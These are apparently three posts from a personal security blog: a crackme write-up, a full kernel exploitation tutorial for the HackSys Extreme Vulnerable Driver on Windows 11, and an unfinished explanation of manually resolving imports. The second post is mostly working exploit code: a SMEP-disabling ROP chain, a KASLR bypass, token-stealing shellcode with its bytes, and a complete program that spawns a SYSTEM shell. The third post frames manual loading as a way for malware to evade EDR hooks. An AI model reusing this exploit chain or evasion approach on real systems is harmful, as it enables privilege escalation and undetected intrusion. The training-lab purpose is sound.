[ { "title": "Cracking Git's Medium-Hard Crack me :3", "url": "/R4vensP1t/posts/Pwning-git's-simple-crackme-medium-hard/", "categories": "crackmes", "tags": "crackme, reverse engineering", "date": "2025-08-28 16:43:03 +0000", "content": "Infos Author: git Language: C/C++ Difficulty: 2.3 Platform: Windows Arch: x86-64 Binary Name : plzcrackme.exe MD5: 49c66031be227cc5982daadfd7368e9d SHA1: 0f01dfd5c1775dd7b605c992903d67bbafa3051f SHA256: 67b06c9c003f0c26c319d82b1fc6436207eaf0e3ed31f438312be8349225272f Link: https://crackmes.one/crackme/68e2b4652d267f28f69b738e initial testing the binary seems to be simple asks for a key and waits for input if the input is incorrect it prints “incorrect” i tried inputing a long string to see if i get a segfault but nothing so this probably won’t be a buffer overflow also inputing an empty string doesn’t work so these critical cases are well handled Static Analysis First of all the binary doesn’t seem to be packed so il fire up ida and take a look at the main function of the binary, i immediately noticed some base64 encrypted strings i see more than one so maybe they will get decrypted and concatenated to get the password. next we already saw that the program prints “incorrect” if the password is wrong so il look for the string and its refs so i quickly get a look at how the check happens. well i found some strings that tend to look like a password :D after testing all of them none worked ): well even our main plan didn’t work searching for the string “incorrect” didn’t return any resutls which is weird so ig it is encrypted and we already saw some encrypted strings so yea we r getting closer (i hope m not wasting my time). i found this snippet inside the main function that looks like it will be used for decryption mainly because of the alphabet string that might be used to decrypt the base64 strings well that was easy all we gotta do is move to dynamic analysis put a breakpoint on this function and single step until somewhere we will see the decrypted password in the memory or some register Agh ! ofc it won’t be this easy classic anti debugging techniques so we first have to bypass them and get to the actual function we care about enough of static analysis Dynamic Analysis attaching to the binary then entering the password will immedietaly shut down both processes as we saw before isdebuggerpresent() is being called so what il do is set a breakpoint right before the call so we can bypass it somehow the instruction at offset 16C6 is 3 instructions away from the isdebuggerpresent() call so il set a breakpoint there to do so we just get the exe base and add it to the offset nice we stopped just before the call to is debugger present, we can do this the hard way by going through the call but when we get to the test to see if the debugger is present or not which happens in eax where the return value in windows x64 calling convention gets stored, for example here it tests if its zero or not then jumps to a function if its not zero which means if a debugger is attached it will jump to that function which after going through we notice it calls some ints i can guess used for process termination so what we can do is simply after the call set eax to 1 and this way we bypass the check :D this is the right way to avoid breaking the program but after reading more instructions down i notice more calls to similar functions to see if a debugger is present so what il do since m lazy il patch one of the calls to just jump over all these calls to where i think the actual juice is i set a jump instruction to the rva 17AF which is imul rax,r9,64 i simply chose this because i didn’t see any more calls to sus functions that most likely are anti debuggin techniques BEFORE: AFTER: i kept single stepping through the instructions and easily i got this well that was easy ^^ the password is : TotallySecureKey123 ironic Conclusion the crackme is definitely not a medium to hard its easy to medium but it was fun " }, { "title": "Exploiting HEVD Stack Buffer Overflow --- Windows 11 x64", "url": "/R4vensP1t/posts/Exploiting-HEVD-StackBufferOverflow/", "categories": "HEVD", "tags": "binaryexploitation, drivers, kernel", "date": "2025-08-28 16:43:03 +0000", "content": "In this guide, I will exploit the HackSys Extreme Vulnerable Driver. Specifically, we will target the stack buffer overflow vulnerability on Windows 11 Build 24H2. I will explain everything you need to understand how this exploit works, but you should already have at least the following knowledge: We will go as blindly as possible, ignoring the driver’s source code and focusing mainly on reverse engineering it. This Guide Will Cover Prerequisites How To Communicate With A driver From usermode Gathering Informations Hijacking The Execution Flow Security Measures Bypassing KASLR Bypassing SMEP Writing The Shellcode Full Exploit References Prequesites C language and x64 Assembly Basic reverse engineering skills Some understanding on windows internals Basic Binary exploitation understanding (buffer overflows) How To Communicate With A driver From usermode A usermode Program sends a recieves data from a Driver using something called IOCTLS Input/Output Control Code Which is a request the usermode program sends to a driver using BOOL DeviceIoControl( [in] HANDLE hDevice, [in] DWORD dwIoControlCode, [in, optional] LPVOID lpInBuffer, [in] DWORD nInBufferSize, [out, optional] LPVOID lpOutBuffer, [in] DWORD nOutBufferSize, [out, optional] LPDWORD lpBytesReturned, [in, out, optional] LPOVERLAPPED lpOverlapped ); As you can see it takes 8 params A handle to driver we want to communicate with a dwIoControlCodewhich is a unique identifier defined inside the driver that tells it what to do for example if it recieves dwIoControlCode number 1 Do something and its all defined inside a switch statement in the driver then we need an in and out buffer both are optional but incase the driver needs a information then sends back information you need to provide the data to send and where to recieve the data sent back by the driver so now if we want to communicate with our HEVD driver we will need the dwIoControlCode usually you have two options whether you try to fuzz it since most of the times devs use ioctl codes that start from 0x800 so you can fuzz a 100 codes and see if you get any exceptions or errors that tells us that we indeed sent a valid ioctl code, or we can simply reverse engineer the driver and look inside the DeviceIoctlHandler() routine to see how it handles incoming ioctls where we can also get the exact ioctlcodes Gathering Informations Now this is a very important part where we reverse engineer the driver and try to get as many infos about it as possible first we are targeting the stack buffer overflow vuln in our case the driver ruins all the fun because of the strings since every vuln is inside a function with the vulnribility name before that lets get the ioctl code for our function As you can see here is the name of our function inside the driver now the driver will call this function if it recieves an ioctl with a spesific code we need to find this code we find this function which inside drivers handles the IOCTLS sent by the user as you can see in ida’s graph view we can immedieatly know that this is what we are looking for since it has a lot of branches which is how a switch statement should look (as i said the ioctl codes are handled using a switch statement) after some looking we find this snippet that has a string in it called aHevdIoctlBuffe_1 db '****** HEVD_IOCTL_BUFFER_OVERFLOW_STACK ******',0Ah,0 which is what we are looking for ! by following the true statement that led to our previous function we get here and as you can see it is exactly what we are looking for 0x22203 this is our ioctl code ! or it is contained withing it since ioctl codes don’t just contain the unique identifier that decided what operation the driver should do it also has more informations #define CTL_CODE(DeviceType, Function, Method, Access) \\ (((DeviceType) &lt;&lt; 16) | ((Access) &lt;&lt; 14) | ((Function) &lt;&lt; 2) | (Method)) 1) DeviceType (16 bits) Identifies the type of device (e.g., FILE_DEVICE_UNKNOWN, FILE_DEVICE_DISK). Example: 0x22 for a custom driver. 2) Function (12 bits) Unique number that tells the driver which function/operation you want. Example: 0x803 might correspond to “trigger stack overflow”. 3) Method (2 bits) Defines how data is passed between user mode and kernel mode: METHOD_BUFFERED METHOD_IN_DIRECT METHOD_OUT_DIRECT METHOD_NEITHER 4) Access (2 bits) Specifies required access rights: FILE_ANY_ACCESS FILE_READ_ACCESS FILE_WRITE_ACCESS now when we pass the full ioctl to the driver’s DispatchDeviceControl routine inside the driver you would find something like this NTSTATUS DriverDeviceControl(PDEVICE_OBJECT DeviceObject, PIRP Irp) { PIO_STACK_LOCATION irpSp = IoGetCurrentIrpStackLocation(Irp); ULONG IoControlCode = irpSp-&gt;Parameters.DeviceIoControl.IoControlCode; switch (IoControlCode) { case IOCTL_STACK_OVERFLOW: // handle stack overflow break; case IOCTL_ARBITRARY_OVERWRITE: // handle arbitrary overwrite break; // ... } } what we need to do now is know what function code is in 0x222003, you can just ask chatgpt to do the math for you (not really math you just need to write it in binary and split it into the parts i mentioned previously to get the function code) we get function code number 0x800 Perfect ! now we got our function code and we are ready to send our ioctl into the driver from a usermode program (soon will be an exploit) first we get a handle to the driver HANDLE hDriver = CreateFile(L\"\\\\\\\\.\\\\HacksysExtremeVulnerableDriver\", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL); if (hDriver == INVALID_HANDLE_VALUE) { printf(\"[!] Error while creating a handle to the driver: %d\\n\", GetLastError()); return 1; } then we call DeviceIoControl(hDriver, 0x222003, NULL, 0, NULL, 0, NULL, NULL); here we are sending nothing but we will send a payload later this is how we will be testing out the driver from user mode now lets get into the exploitation part so lets go line by line here since i think its the best way to understand whats going on, before we do that lets recall our goal since its easy to get lost when reverse engineering without a goal. our goal here is to identify the vulnerability or the vulnerable function call being used. as you can see in the picture we have a variable called KernelBuffer that lives 818h bytes below the stack pointer (rsp) lets not get deeper into the variables just yet and try to find out where the vulnerability exactly is. so what we are looking for are call instructions, inside the function we find two interesting call instruction first is call memset and second is call memmove which is a known patters we first allocate space in the stack we fill it with something using memset then we move some data into the allocated space so first we need to understand how the memset function is being called,what i mean by that is knowing exactly what the stack layout is when its being called then we can see whats actually being moved using memmove and ofc we can guess its the buffer sent from usermode. IMPORTANT NOTE: you can just inject a pattern generated by the metasploit framework and then locate exactly where rip gets overwritten but i think its much more fun to do all the calculations then see if it turns out to be right First we have this part KernelBuffer= dword ptr -818h var_18= byte ptr -18h arg_0= qword ptr 8 arg_8= qword ptr 10h arg_10= qword ptr 18h UserBuffer = rcx Size = rdx where ida shows us the variables being used in the function, we have KernelBuffer -818h means 818h bytes below the stack pointer then we have var_18 18h bytes below the stack pointer then we have a bunch of variables above the stack pointer we don’t care about those for now, then we have rcx which has kernelbuffer and rdx which is size these are the windows x64 calling convention where the first param when calling a function goes into rcx the second into rdx the third into r8 we will need this later mov [rsp+arg_0], rbx mov [rsp+arg_8], rsi mov [rsp+arg_10], rdi push r12 push r14 push r15 sub rsp, 820h mov rsi, Size mov rdi, UserBuffer xor ebx, ebx mov r12d, 800h mov r8d, r12d ; Size xor edx, edx ; Val lea UserBuffer, [rsp+838h+KernelBuffer] ; void * call memset nop it starts with moving some variables into their allocated space mov [rsp+arg_0], rbx mov [rsp+arg_8], rsi mov [rsp+arg_10], rdi these are above rsp again we don’t care about these for now push r12 push r14 push r15 next we have 3 registers since we are in x64 each register is 64 bit long (8 bytes) this part is important since by pushing a register we are moving the rsp so we move it by 8*3 which is 24 now we are 24 bytes below rsp (-24 or 18h) then we allocate 820h bytes in the stack using the sub instruction sub rsp, 820h so now rsp is 820h + 18h so 838h below the initial rsp mov rsi, Size mov rdi, UserBuffer here we are saving rcx and rdx before using them (Size is rdx and UserBuffer is rcx) xor ebx, ebx mov r12d, 800h mov r8d, r12d ; Size xor edx, edx ; Val lea UserBuffer, [rsp+838h+KernelBuffer] ; void * call memset here comes the x64 calling convention we said that the first param goes into rcx the second into rdx and the third into r8 which is whats happening here we are calling memset where the first argument is rsp+838h+KernelBuffer the second one is 0 since we xored edx and finally the third one is 800h so we are writing 800h of zeroes into rsp+838h+KernelBuffer so we need to understand what that actually means when the lea instruction is called we know that rsp is 838h below the initial rsp so it is -838h we have -838+838h+KernelBuffer so basically whats happening here is cancelling the 838h bytes in order to only have KernelBuffer which lives 818h below rsp or we have rsp+838h+KernelBuffer = rsp + 838h - 818h = rsp + 20h. Perfect ! now we know how our stack layout Perfect ! now we know how our stack layout Hijacking The Execution Flow As you can see here we have the second call which is to memmove where we write memory and where the vulnrebility is, it moves our user mode buffer into the kernel buffer which is 800h bytes big so what we need to do is first write the entire buffer then write the 8 pushed registers and then 8 more to overwrite rip so 800h + 18h = 818h = 2027 and thats exactly where rip is we can use msf-pattern_create to create a pattern to know exactly where rip is msf-pattern_create -l 3000 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8... we store the pattern inside a buffer and send it to the driver then using windbg 1: kd&gt; dq rsp the last byte is rip so you can try this on your own get the last byte the run it on msf-pattern_offset and you will get the exact 2027 we got well the offset maybe a bit off but you can fix that on your own now we managed to overwrite rip and cause a dos attack but thats not what we want, we want to hijack the execution flow and make the driver execute a usermode shellcode so here i have a simple shellcode thats just a bunch of nops LPVOID buf = VirtualAlloc(NULL, 3000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); LPVOID shellcode = VirtualAlloc(NULL, 500, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); memset(buf, 0x41, 3000); memset(shellcode,0x90,500); QWORD((QWORD)buf + 2072) = (QWORD)shellcode; nice now we send the buffer and see *** Fatal System Error: 0x000000fc Oops ! Fatal system error well this is expected since executing usermode shellcode is not allowed because of SMEP Security Measures SMEP as you can see SMEP is not letting us execute shellcode we allocated in our program memory which sucks but lucky for us there are two ways to bypass it Methode 1: What we will do is change the 20th bit in the CR4 Register this bit controls SMEP if we can set it to 0 we disable it and we can execute shellcode from usermode, in this methode we can use rop gadgets in order to change the bit or we need another vulnerability to do so but usually since we are in kernel mode rop is the way and i will explain why later since this is the method we will use Methode 2: this technique is more modern what we do is get the PTE address of our shellcode in memory in order to change the 2nd bit which marks our shellcode as a Kernel page therefore it will allow us to execute shellcode ,here is a poc where he used this technique. KASLR Kernel Address Space Layout Randomization is a security feature that randomizes the memory layout of the operating system’s kernel and its components each time the system boots. so this exploit assumes you are already in the system and have at least a shell into the target machine which makes KASLR useless but for example if you don’t have access to the target machine its not possible to know the base address of the kernel without a memory leak vulnerability and without the kernel base you can’t write your exploit like writing to kernel memory you need to write all your kernel addresses relative to the kernel base but luckily for us this is not a problem we can use windows api to get the kernel base address dynamically or you can even use windbg or a debugger to get it. Bypassing KASLR lets start with KASLR as i said this is very easy and we can write a simple function that gets the kernel base for us so we don’t need to worry about it. uint64_t GetKernelBaseAddress() { ULONG_PTR pKernelBaseAddress = 0; LPVOID* lpImageBase = NULL; DWORD dwBytesNeeded = 0; if (!EnumDeviceDrivers(NULL, 0, &amp;dwBytesNeeded)) { printf(\"[-] Failed to calculate bytes needed for device driver entries\"); return -1; } if (!(lpImageBase = (LPVOID*)HeapAlloc(GetProcessHeap(), 0, dwBytesNeeded))) { printf(\"[-] Failed to allocate heap for lpImageBase\\n\"); if (lpImageBase) { HeapFree(GetProcessHeap(), 0, lpImageBase); } return -1; } if (!EnumDeviceDrivers(lpImageBase, dwBytesNeeded, &amp;dwBytesNeeded)) { printf(\"[-] EnumDeviceDrivers: %d\", GetLastError()); if (lpImageBase) { HeapFree(GetProcessHeap(), 0, lpImageBase); } return -1; } pKernelBaseAddress = ((ULONG_PTR*)lpImageBase)[0]; HeapFree(GetProcessHeap(), 0, lpImageBase); printf(\"[*] Kernel Base Address: %llx\\n\", pKernelBaseAddress); return pKernelBaseAddress; } what we are doing here is getting the address of ntoskrnl.exe which is the windows kernel itself, its the first loaded driver therefore lpImageBase[0] gives us its address Well that was easy ! we bypassed KASLR by getting the kernel base address Bypassing SMEP now this will be harder since we will need to use rop (return oriented programming) to bypass SMEP. we will use the first method so we will need to change the value of cr4 into the same value but we flip the 20th bit, we are left with two choices here whether we use a rop chain like this : pop REGISTER mov cr4, REGISTER in this case we will need to read the value of cr4 using a debugger then flip the bit and put it in our stack or the best approach is: pop REGISTER1 // 0x100000 xor cr4, REGISTER obviously the second one is much better but we don’t really have a choice we have to check if these rop gadgets are available but the good news is since we are in the kernel all drivers are loaded in the same memory so we don’t need to only look for gadgets inside HEVD we can look inside any driver ! we will try to find gadgets for the first method since i am sure we will find inside ntoskernl.exe to do so we can use a bunch of tools like ROPgadget Ropper in this guide we will use ropper ropper --file ntoskrnl.exe --console search %cr4% &gt; 0x0000000140207c53: mov cr4, rcx; ret; search pop rcx &gt; 0x00000001404bc9a7: pop rcx; ret; make sure to get ntoskrnl from the target machine and don’t use the gadgets i got until you are sure they exist in your build nice we have what we need we can write an exploit now #include &lt;stdio.h&gt; #include &lt;Windows.h&gt; #include &lt;Psapi.h&gt; #include &lt;stdlib.h&gt; #include &lt;stdint.h&gt; #define QWORD ULONGLONG uint64_t GetKernelBaseAddress() { ULONG_PTR pKernelBaseAddress = 0; LPVOID* lpImageBase = NULL; DWORD dwBytesNeeded = 0; if (!EnumDeviceDrivers(NULL, 0, &amp;dwBytesNeeded)) { printf(\"[-] Failed to calculate bytes needed for device driver entries\"); return -1; } if (!(lpImageBase = (LPVOID*)HeapAlloc(GetProcessHeap(), 0, dwBytesNeeded))) { printf(\"[-] Failed to allocate heap for lpImageBase\\n\"); if (lpImageBase) { HeapFree(GetProcessHeap(), 0, lpImageBase); } return -1; } if (!EnumDeviceDrivers(lpImageBase, dwBytesNeeded, &amp;dwBytesNeeded)) { printf(\"[-] EnumDeviceDrivers: %d\", GetLastError()); if (lpImageBase) { HeapFree(GetProcessHeap(), 0, lpImageBase); } return -1; } pKernelBaseAddress = ((ULONG_PTR*)lpImageBase)[0]; HeapFree(GetProcessHeap(), 0, lpImageBase); printf(\"[*] Kernel Base Address: %llx\\n\", pKernelBaseAddress); return pKernelBaseAddress; } int main() { HANDLE hDriver = CreateFile(L\"\\\\\\\\.\\\\HacksysExtremeVulnerableDriver\", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL); if (hDriver == INVALID_HANDLE_VALUE) { printf(\"[!] Error while creating a handle to the driver: %d\\n\", GetLastError()); return 1; } ULONG_PTR ntBase = GetKernelBaseAddress(); // gets the kernel base address QWORD POP_RCX = ntBase + 0x207c53; // change the offset to what you got from ropper QWORD MOV_CR4_RCX = ntBase + 0x4bc9a7; // change the offset to what you got from ropper LPVOID buf = VirtualAlloc(NULL, 3000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); LPVOID shellcode = VirtualAlloc(NULL, 500, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); int bufSize = 2072 + 4 * 8; memset(buf, 0x41, bufSize); memset(shellcode,0x90,500) QWORD* rop = (QWORD*)((QWORD)uBuffer + 2072); int i = 0; *(rop + i++) = POP_RCX; *(rop + i++) = 0; // set cr4 to 0 for now *(rop + i++) = MOV_CR4_RCX; *(rop + i++) = (QWORD)shellcode; DeviceIoControl(hDriver, 0x222003, buf, 2500, NULL, 0, NULL, NULL); return 0; } what you need to do now is run the exploit you will get a BSOD then in windbg run r cr4 which is the value of cr4 we need to change so we will next update the exploit with the right address for me i got 0x370e78 but it might be different for you here is the updated main int main() { HANDLE hDriver = CreateFile(L\"\\\\\\\\.\\\\HacksysExtremeVulnerableDriver\", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL); if (hDriver == INVALID_HANDLE_VALUE) { printf(\"[!] Error while creating a handle to the driver: %d\\n\", GetLastError()); return 1; } ULONG_PTR ntBase = GetKernelBaseAddress(); // gets the kernel base address QWORD POP_RCX = ntBase + 0x207c53; // change the offset to what you got from ropper QWORD MOV_CR4_RCX = ntBase + 0x4bc9a7; // change the offset to what you got from ropper LPVOID buf = VirtualAlloc(NULL, 3000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); LPVOID shellcode = VirtualAlloc(NULL, 500, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); int bufSize = 2072 + 4 * 8; memset(buf, 0x41, bufSize); memset(shellcode,0x90,500) QWORD* rop = (QWORD*)((QWORD)uBuffer + 2072); int i = 0; *(rop + i++) = POP_RCX; *(rop + i++) = 0x370e78 ^ 1UL &lt;&lt; 20; // flips the 20th bit *(rop + i++) = MOV_CR4_RCX; *(rop + i++) = (QWORD)shellcode; DeviceIoControl(hDriver, 0x222003, buf, 2500, NULL, 0, NULL, NULL); return 0; } before we run the exploit we will set a break point inside the vulnerable function so we can see the nops being executed : ba e1 HEVD!TriggerBufferOverflowStack nice now run the exploit then keep going step by step until you reach the memmove which is a memcpy you will see something like this 1: kd&gt; 0000026a`93680000 90 nop thats it we mananged to execute shellcode ! Writing The Shellcode now since our test shellcode worked we can right real shellcode, we are in kernel mode so first idea that comes to mind is token so we will steal a token and give it to our process in order to escalate our privs so lets right our shellcode [BITS 64] start: mov rax, [gs:0x188] ; KPCRB.CurrentThread (_KTHREAD) mov rax, [rax + 0xb8] ; APCState.Process (current _EPROCESS) mov r8, rax ; Store current _EPROCESS ptr in r8 loop: mov r8, [r8 + 0x1d8] ; ActiveProcessLinks.Flink sub r8, 0x1d8 ; Go back to start of _EPROCESS mov r9, [r8 + 0x1d0] ; UniqueProcessId (PID) cmp r9, 4 ; SYSTEM PID == 4? jnz loop ; Loop until PID == 4 replace: mov r9, [r8 + 0x248] ; Get SYSTEM token and cl, 0xf0 ; Clear low 4 bits of _EX_FAST_REF structure mov [rax + 0x248], r9 ; Copy SYSTEM token to current process what this does is first get the current thread in the cpu then inside the APCState there is a field for the current EPROCESS called APCState.Process, in kernel mode all EPROCESS are linked in a doubly linked circular list inside ActiveProcessLinks we find the address to the next process so we traverse the list and we subtract the offset of the ActiveProcessLinks so we get to the start of the EPROCESS then we look at the UniqueProcessId to find the process id we are looking for pid number 4 which is the SYSTEM pid once we find it we get its token and copy it into our EPROCESS which gives us the same privs Generic Cleanup Technique if you run the exploit with that shellcode you will get a BSOD, why ? well because we hijacked the execution flow and altered with the registers so after our shellcodes finishes the system expects the registers to have the values it had before the hijack and thats why we need to preform proper cleanup when we exit our shellcode. we can push all registers before we do anything then pop them at the end of the shellcode but i guess you will need more rop chains to backup the registers before the op or what we can do is use a structure inside our current thread struct ETHREAD which holds the registers before we entered kernel mode so instead of staying in kernel mode we go back to user mode you can read more about it from here we basically mimic what the system does when calling syscall which is how the system tells the kernel to do stuff from usermode here is the code cleanup: mov rax, [gs:0x188] ; _KPCR.Prcb.CurrentThread mov cx, [rax + 0x1e4] ; KTHREAD.KernelApcDisable inc cx mov [rax + 0x1e4], cx mov rdx, [rax + 0x90] ; ETHREAD.TrapFrame mov rcx, [rdx + 0x168] ; ETHREAD.TrapFrame.Rip mov r11, [rdx + 0x178] ; ETHREAD.TrapFrame.EFlags mov rsp, [rdx + 0x180] ; ETHREAD.TrapFrame.Rsp mov rbp, [rdx + 0x158] ; ETHREAD.TrapFrame.Rbp xor eax, eax ; swapgs o64 sysret now our shellcode is [BITS 64] start: mov rax, [gs:0x188] ; KPCRB.CurrentThread (_KTHREAD) mov rax, [rax + 0xb8] ; APCState.Process (current _EPROCESS) mov r8, rax ; Store current _EPROCESS ptr in r8 loop: mov r8, [r8 + 0x1d8] ; ActiveProcessLinks sub r8, 0x1d8 ; Go back to start of _EPROCESS mov r9, [r8 + 0x1d0] ; UniqueProcessId (PID) cmp r9, 4 ; SYSTEM PID? jnz loop ; Loop until PID == 4 replace: mov r9, [r8 + 0x248] ; Get SYSTEM token and cl, 0xf0 ; Clear low 4 bits of _EX_FAST_REF structure mov [rax + 0x248], r9 ; Copy SYSTEM token to current process cleanup: mov rax, [gs:0x188] ; _KPCR.Prcb.CurrentThread mov cx, [rax + 0x1e4] ; KTHREAD.KernelApcDisable inc cx mov [rax + 0x1e4], cx mov rdx, [rax + 0x90] ; ETHREAD.TrapFrame mov rcx, [rdx + 0x168] ; ETHREAD.TrapFrame.Rip mov r11, [rdx + 0x178] ; ETHREAD.TrapFrame.EFlags mov rsp, [rdx + 0x180] ; ETHREAD.TrapFrame.Rsp mov rbp, [rdx + 0x158] ; ETHREAD.TrapFrame.Rbp xor eax, eax ; swapgs o64 sysret convert it into shellcode nasm shellcode.asm -o shellcode.bin -f bin radare2 -b 32 -c 'pc' ./shellcode.bin perfect now we have our shellcode ready Full exploit #include &lt;stdio.h&gt; #include &lt;Windows.h&gt; #include &lt;Psapi.h&gt; #include &lt;stdlib.h&gt; #include &lt;stdint.h&gt; #define QWORD ULONGLONG #define _BUFFER_SIZE 256 const uint8_t sc[_BUFFER_SIZE] = { 0x65, 0x48, 0x8b, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00, 0x48, 0x8b, 0x80, 0xb8, 0x00, 0x00, 0x00, 0x49, 0x89, 0xc0, 0x4d, 0x8b, 0x80, 0xd8, 0x01, 0x00, 0x00, 0x49, 0x81, 0xe8, 0xd8, 0x01, 0x00, 0x00, 0x4d, 0x8b, 0x88, 0xd0, 0x01, 0x00, 0x00, 0x49, 0x83, 0xf9, 0x04, 0x75, 0xe5, 0x4d, 0x8b, 0x88, 0x48, 0x02, 0x00, 0x00, 0x80, 0xe1, 0xf0, 0x4c, 0x89, 0x88, 0x48, 0x02, 0x00, 0x00, 0x65, 0x48, 0x8b, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00, 0x66, 0x8b, 0x88, 0xe4, 0x01, 0x00, 0x00, 0x66, 0xff, 0xc1, 0x66, 0x89, 0x88, 0xe4, 0x01, 0x00, 0x00, 0x48, 0x8b, 0x90, 0x90, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x8a, 0x68, 0x01, 0x00, 0x00, 0x4c, 0x8b, 0x9a, 0x78, 0x01, 0x00, 0x00, 0x48, 0x8b, 0xa2, 0x80, 0x01, 0x00, 0x00, 0x48, 0x8b, 0xaa, 0x58, 0x01, 0x00, 0x00, 0x31, 0xc0, 0x0f, 0x01, 0xf8, 0x48, 0x0f, 0x07, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff }; uint64_t GetKernelBaseAddress() { ULONG_PTR pKernelBaseAddress = 0; LPVOID* lpImageBase = NULL; DWORD dwBytesNeeded = 0; if (!EnumDeviceDrivers(NULL, 0, &amp;dwBytesNeeded)) { printf(\"[-] Failed to calculate bytes needed for device driver entries\"); return -1; } if (!(lpImageBase = (LPVOID*)HeapAlloc(GetProcessHeap(), 0, dwBytesNeeded))) { printf(\"[-] Failed to allocate heap for lpImageBase\\n\"); if (lpImageBase) { HeapFree(GetProcessHeap(), 0, lpImageBase); } return -1; } if (!EnumDeviceDrivers(lpImageBase, dwBytesNeeded, &amp;dwBytesNeeded)) { printf(\"[-] EnumDeviceDrivers: %d\", GetLastError()); if (lpImageBase) { HeapFree(GetProcessHeap(), 0, lpImageBase); } return -1; } pKernelBaseAddress = ((ULONG_PTR*)lpImageBase)[0]; HeapFree(GetProcessHeap(), 0, lpImageBase); printf(\"[*] Kernel Base Address: %llx\\n\", pKernelBaseAddress); return pKernelBaseAddress; } int main() { HANDLE hDriver = CreateFile(L\"\\\\\\\\.\\\\HacksysExtremeVulnerableDriver\", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL); if (hDriver == INVALID_HANDLE_VALUE) { printf(\"[!] Error while creating a handle to the driver: %d\\n\", GetLastError()); return 1; } ULONG_PTR ntBase = GetKernelBaseAddress(); QWORD POP_RCX = ntBase + 0x207c53; // adjust offset according to your kernel build QWORD MOV_CR4_RCX = ntBase + 0x4bc9a7; // adjust offset according to your kernel build printf(\"[&gt;] POP_RCX: 0x%llx\\n\", POP_RCX); printf(\"[&gt;] MOV_CR4_RCX: 0x%llx\\n\", MOV_CR4_RCX); LPVOID uBuffer = VirtualAlloc(NULL, 2500, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); LPVOID shellcode = VirtualAlloc(NULL, 500, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); int bufSize = 2072 + 4 * 8; memset(uBuffer, 0x41, bufSize); RtlCopyMemory(shellcode, sc, 256); QWORD* rop = (QWORD*)((QWORD)uBuffer + 2072); int index = 0; *(rop + index++) = POP_RCX; *(rop + index++) = 0x370e78 ^ 1UL &lt;&lt; 20; *(rop + index++) = MOV_CR4_RCX; *(rop + index++) = (QWORD)shellcode; DeviceIoControl(hDriver, 0x222003, uBuffer, 2500, NULL, 0, NULL, NULL); printf(\"[&gt;] Enjoy your shell!\\n\", ntBase); system(\"cmd\"); return 0; } isn’t this just beautiful !! References i followed this guide in my first try exploiting this vulnerability and it was a huge help, this guide is based of xct github_repo " }, { "title": "Remotely Resolving Imports", "url": "/R4vensP1t/posts/Remotely-Resolving-Imports/", "categories": "Documentations", "tags": "windows, drivers, kernel", "date": "2025-07-28 16:08:03 +0000", "content": "what are imports basically imports are functions a pe needs to function properly, these functions are located inside dlls (dynamic link libraries) so first the executable needs to load the dll then find the functions he needs and get their addresses now in order to know which functions an executable needs there is something called the IAT table which is a table inside the import directory in the pe structure, this table contains all the names of the functions the exe (or the dll) needs as well as their addresses when the exe first lunches the iat will be empty just names but no addresses so windows automatically reads this table, finds which dlls contains the functions, loads them using a function called LoadLibraryA() which will patch this table with then use something like GetProcAddress() to get the function addresses then patch the iat table with the correct addresses so the exe now works well What is Manual Loading instead of letting windows do all the stuff i just mentioned we do everything manually, Why? for a lot of reasons like windows uses high-level api functions like LoadLibraryA() or GetProcAddress() which in case the system has an edr installed will def be hooked therefore your malware will immedieatly gets detected to avoid this we manually patch the iat table how is it done first of all since we are dealing with a pe you need to parse the pe and get the ntheader, this guide is about remotely resolving imports but in order to do so you would have to first write the pe into the target process with all the headers and sections so first of all get the import directory rva (relative virtual address) which is stored in ntHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress where IMAGE_DIRECTORY_ENTRY_IMPORT is a macro for 1 next we need the import descriptor IMAGE_IMPORT_DESCRIPTOR it is located at the virtual address so in order to get it IMAGE_IMPORT_DESCRIPTOR* importDesc = (PIMAGE_IMPORT_DESCRIPTOR)(BaseAddress + ntHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress); next we start looping through every dll we use the condition while(importDesc-&gt;Name) we first get the dll name which is stored in importDesc-&gt;Name so const char* dllName = (char*)(BaseAddress + currentDesc-&gt;Name); and then we load the library so we can get the functions inside it HMODULE dllHandle = LoadLibraryA(dllName); now we can access the dll what we need to do is read what fucntions the pe needs and get their addresses from the loaded dll we have originalThunk and 